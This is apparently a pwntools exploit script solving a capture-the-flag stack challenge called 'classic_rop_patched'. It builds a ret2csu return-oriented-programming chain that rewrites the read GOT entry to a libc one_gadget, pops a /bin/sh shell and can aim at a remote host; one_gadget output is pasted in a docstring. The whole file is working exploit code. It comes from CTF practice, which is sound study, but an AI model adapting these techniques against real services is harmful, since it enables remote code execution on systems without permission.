#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('classic_rop_patched')
# context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+59
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

"""
~/Desktop/BinExp/Challs/STACK/ClassicROP ❯ one_gadget libc.so.6 
0x50a47 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""

def solve():
    add_what_where = 0x0000000000400618 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
    csu_pop = 0x000000000040071a
    csu_call = 0x0000000000400700
    offset = 18

    rbx = 0xfffd74b8 # u32(p32(-166728, signed=True)) == one_gadget - exe.plt['read]
    rbp = exe.got['read'] + 0x3d
    r12 = 0x0
    r13 = 0x0
    r14 = 0x0
    r15 = 0x0

    rbx2 = 0x0
    rbp2 = 0x0601030 + 0x78
    r12_2 = exe.got['read']
    r13 = 0x0
    r14 = 0x0
    r15 = 0x0


    payload = flat({
        offset: [
            csu_pop,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15,
            add_what_where,
            csu_pop,
            rbx2,
            rbp2,
            r12_2,
            r13,
            r14,
            r15,
            csu_call

        ]
    })

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

